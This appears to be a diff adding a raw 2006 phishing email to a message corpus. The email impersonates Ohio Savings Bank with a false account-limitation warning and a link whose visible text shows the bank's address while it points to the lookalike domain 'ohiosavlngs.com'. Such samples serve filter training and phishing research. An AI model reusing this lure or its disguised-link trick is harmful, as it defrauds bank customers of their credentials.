@@ -1,0 +1,92 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id C34562A88C
+	for <user@example.com>; Tue, 28 Feb 2006 06:07:52 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+	id AEFC4621C9A; Tue, 28 Feb 2006 06:07:52 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 8FFD8621C95
+	for <user@example.com>; Tue, 28 Feb 2006 06:07:52 -0500 (EST)
+Received: (from user@localhost)
+	by mail.example.com id GAA25660
+	for user@example.com; Tue, 28 Feb 2006 06:07:52 -0500
+Received: from GREGHOME (c-68-35-120-198.hsd1.nm.comcast.net [68.35.120.198])
+	by mail.example.com with ESMTP id GAA25652
+	for <user@biocserver.cwru.edu>; Tue, 28 Feb 2006 06:07:51 -0500
+Received: from User ([66.142.120.142]) by GREGHOME with Microsoft SMTPSVC(5.0.2195.6713);
+	 Tue, 28 Feb 2006 04:17:18 -0700
+From: "Ohio Savings Bank" <service@ohiosavings.com>
+Subject: We are contacting you to remind you that...
+Date: Tue, 28 Feb 2006 05:07:07 -0600
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <GREGHOME1Wtyi67EKRu00000097@GREGHOME>
+X-OriginalArrivalTime: 28 Feb 2006 11:17:18.0394 (UTC) FILETIME=[893D91A0:01C63C58]
+To: undisclosed-recipients: ;
+Content-Length: 2561
+Lines: 51
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 319
+
+<META HTTP-EQUIV="Expires" CONTENT="-1">
+<META http-equiv=Content-Type content="text/html; charset=windows-1250">
+<STYLE>P {
+	FONT-SIZE: 8pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+BODY {
+	FONT-SIZE: 8pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+TD {
+	FONT-SIZE: 8pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+H2 {
+	FONT-WEIGHT: bold; FONT-SIZE: 16pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+H3 {
+	FONT-WEIGHT: bold; FONT-SIZE: 12pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+.TDError {
+	FONT-WEIGHT: bold; FONT-SIZE: 12pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+</STYLE>
+<LINK href="files/Guaranty.css" type=text/css 
+rel=stylesheet>
+
+<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
+<BODY bgColor=#ffffff>
+<p><img src="http://www.ohiosavings.com/images/ohiologo.gif"></p>
+<p><font face="Arial, Helvetica, sans-serif" size="2">Dear Customer, </font> </p>
+<p><font face="Arial, Helvetica, sans-serif" size="2">We are contacting you to 
+  remind you that our Account Review Team identified some unusual activity in 
+  your account. In accordance with Ohio Savings Bank's User Agreement and 
+  to ensure that your account has not been compromised, access to your account 
+  was limited. Your account access will remain limited until this issue has been 
+  resolved. We encourage you to sign on and perform the steps necessary to restore 
+  your account access as soon as possible. Allowing your account access to remain 
+  limited for an extended period of time may result in further limitations on 
+  the use of your account and possible account closure. To view and perform the 
+  verification process, please click on the link below:</font></p>
+<p><font size="2"><a href="http://www.ohiosavlngs.com/">http://www.ohiosavings.com</a></font></p>
+<p><font face="Arial, Helvetica, sans-serif" size="2">Ohio Savings Bank is 
+  committed to maintaining a safe environment for our customers. To protect the 
+  security of your account, our bank employs some of the most advanced security 
+  systems in the world and our anti-fraud teams regularly screen the Online Banking 
+  system for unusual activity. </font></p>
+<p><font face="Arial, Helvetica, sans-serif" size="2">Thank you for your prompt 
+  attention to this matter. Please understand that this is a <font color="#FF0000">security 
+  measure</font> meant to help protect you and your account. We apologize for 
+  any inconvenience. </font></p>
+<p><font face="Arial, Helvetica, sans-serif" size="2">Sincerely, <br>
+  Ohio Savings Bank, Customer Service.</font></p>
+</BODY></HTML>
+
